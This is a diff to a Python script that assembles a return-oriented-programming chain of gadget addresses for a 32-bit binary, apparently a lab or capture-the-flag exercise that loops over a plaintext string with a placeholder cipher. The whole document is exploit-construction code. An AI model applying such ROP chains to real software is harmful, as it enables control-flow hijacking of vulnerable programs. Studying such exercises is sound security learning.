@@ -33,7 +33,10 @@ the_esp_op = 0x0809c3c1  # add esp, dword ptr [ebx + eax*4]; ret;
 
 move_bp_edx_al_clobber_eax = 0x0806dac2  # mov byte ptr [edx], al; mov eax, edx; ret;
 add_eax_edx = 0x08071393  # add eax, edx ; ret
-stdout.write("Doo Bar Baz\n")  # To be read into `plaintext`
+nop = 0x08049caf  # nop; ret;
+
+break_char = ord('B')
+stdout.write("DAo Bar Baz\n")  # To be read into `plaintext`
 
 # Note payload cannot contain ord("\n")
 
@@ -52,15 +55,17 @@ code = [
     0,
     0x0,
 
-    # Load Element
-    # al = **counter_addr
-    pop_eax,
-    counter_addr,
-    mov_eax_peax,
-    mov_eax_peax,
-    pop_ebx,
-    plaintext,
-    xlatb,
+    # # Load Element
+    # # al = **counter_addr
+    # pop_edx_ebx,
+    # plaintext,
+    # plaintext,
+    #
+    # pop_eax,
+    # counter_addr,
+    # mov_eax_peax,
+    # sub_eax_edx,
+    # xlatb,
 
     # ecx = 0
     pop_eax,
@@ -71,19 +76,25 @@ code = [
     # i.e. CF is set if we do sub char - '\n'
     # Load the '\n'
 
-    # edx = char to bk + 1
-    pop_eax,
-    ord('D') + 1,  # TODO: should be \n + 1
-    xchg_eax_edx,
-
     # eax = (byte) **counter_addr
     # TODO: change to using counter_addr
     # Load Element
-    pop_eax,
-    0x0,
-    pop_ebx,
+    pop_edx_ebx,
     plaintext,
+    plaintext,
+
+    pop_eax,
+    counter_addr,
+    mov_eax_peax,
+    sub_eax_edx,
     xlatb,
+    nop,
+
+    # edx = char to bk + 1
+    xchg_eax_edx,
+    pop_eax,
+    break_char + 1,  # TODO: should be \n + 1
+    xchg_eax_edx,
 
     # ecx = 1 if **counter_addr <= char to bk
     sub_eax_edx,
@@ -93,10 +104,9 @@ code = [
     # TODO: Tune the next set to the number of instructions left in the `code` list after the_esp_op
     double_ecx,
     double_ecx,
-    inc_ecx,  # cannot use inc, can only use double
-    inc_ecx,
-    inc_ecx,
-    inc_ecx,
+    double_ecx,
+    double_ecx,
+    double_ecx,
 
     # ecx *= 4
     # i.e. ecx is the offset for esp
@@ -104,6 +114,7 @@ code = [
     double_ecx,
     double_ecx,
 
+    nop,
     # ebx = offset_addr
     pop_ebx,
     offset_addr,
@@ -120,32 +131,30 @@ code = [
     0x0,
     # esp += [ebx + 4 * eax] => esp += *offset_addr
     the_esp_op,
-
+    nop,
 
     # edx = ctr address
-    pop_eax,
-    counter_addr,
-    mov_eax_peax,
-    mov_eax_peax,
-    xchg_eax_edx,
-    pop_eax,
-    plaintext,
-    add_eax_edx,
-    xchg_eax_edx,
 
     # Load Element
     # al = **counter_addr
+    pop_edx_ebx,
+    plaintext,
+    plaintext,
     pop_eax,
     counter_addr,
     mov_eax_peax,
-    mov_eax_peax,
-    pop_ebx,
-    plaintext,
+    sub_eax_edx,
     xlatb,
 
     # Increment
     # TODO: the actual cipher
     inc_eax,
+
+    xchg_eax_edx,
+    pop_eax,
+    counter_addr,
+    mov_eax_peax,
+    xchg_eax_edx,
 
     # Write element to ebx
     # edx = plaintext + counter_variable
@@ -154,6 +163,21 @@ code = [
     # TODO: *counter_addr++
 
     # TODO: Set the offset of the top of the loop, and go there
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
+    nop,
 ]
 
 return_seq = [
